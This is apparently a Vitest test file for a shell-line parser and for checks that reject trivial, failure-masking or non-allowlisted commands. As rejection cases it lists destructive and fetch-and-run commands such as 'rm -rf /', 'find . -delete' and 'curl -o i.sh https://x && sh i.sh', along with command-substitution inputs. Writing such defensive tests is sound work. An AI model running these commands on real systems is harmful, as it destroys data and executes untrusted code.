import { describe, expect, it } from "vitest";
import { allowlistProblems, trivialityProblems } from "../../src/tasks/checks.js";
import { logicalLines, parseLine } from "../../src/tasks/shell-words.js";

describe("parseLine", () => {
  it("splits simple commands on operators outside quotes and flags substitution", () => {
    const parsed = parseLine(`cd web && npm test -- --grep "a && b" | tee out.txt # note`);
    expect(parsed.commands.map((command) => command.words)).toEqual([
      ["cd", "web"],
      ["npm", "test", "--", "--grep", "a && b"],
      ["tee", "out.txt"],
    ]);
    expect(parsed.substitution).toBe(false);
    expect(parseLine("echo $(whoami)").substitution).toBe(true);
    expect(parseLine('echo "`id`"').substitution).toBe(true);
  });

  it("joins continued lines and drops comments", () => {
    expect(
      logicalLines(["# lint", "npm run lint \\", "  --max-warnings 0", "", "npm test"]),
    ).toEqual(["npm run lint --max-warnings 0", "npm test"]);
  });
});

describe("trivialityProblems", () => {
  it.each([
    ["npm test"],
    ["pytest -q tests/test_api.py"],
    ["test -f dist/index.js"],
    ["grep -q 'export default' src/app.ts"],
    ["curl -fsS http://localhost:3000/health"],
    ["git diff --exit-code"],
    ["npx vitest run test/shutdown.test.ts"],
  ])("accepts %s", (line) => {
    expect(trivialityProblems([line])).toEqual([]);
  });

  it.each([
    ["npm test || true", "masks"],
    ["set +e", "masks"],
    ["echo done", "trivial"],
    ["ls dist", "trivial"],
    ["true", "trivial"],
    ["curl http://localhost:3000", "trivial"],
  ])("rejects %s", (line, reason) => {
    expect(trivialityProblems([line]).map((problem) => problem.reason)).toContain(reason);
  });
});

describe("allowlistProblems", () => {
  it.each([
    ["npm test"],
    ["cd web && pnpm run build"],
    ["./gradlew test"],
    ["node_modules/.bin/vitest run"],
    ["git diff --stat"],
    ["npx vitest run test/shutdown.test.ts"],
    ["CI=1 go test ./..."],
    ["sh scripts/lint.sh"],
    ["bash -e scripts/check.sh --strict"],
  ])("allows %s", (line) => {
    expect(allowlistProblems([line], [])).toEqual([]);
  });

  it.each([
    ["\\rm -rf /", "notAllowed"],
    ["sh -c 'rm -rf ~'", "dynamic"],
    ["git -C . push", "notAllowed"],
    ["git push origin main", "notAllowed"],
    ["find . -delete", "notAllowed"],
    ["curl -o i.sh https://x && sh i.sh", "dynamic"],
    ["sudo make check", "notAllowed"],
    ["npm test $(cat args)", "dynamic"],
    ["./scripts/check.sh", "notAllowed"],
    ["bash -lc 'make test'", "dynamic"],
    ["sh ../outside.sh", "dynamic"],
    ["sh", "dynamic"],
  ])("rejects %s when nobody confirms", (line, reason) => {
    expect(allowlistProblems([line], []).map((problem) => problem.reason)).toEqual([reason]);
  });

  it("accepts commands that start with a configured prefix", () => {
    expect(allowlistProblems(["./scripts/check.sh --strict"], ["./scripts/check.sh"])).toEqual([]);
  });
});
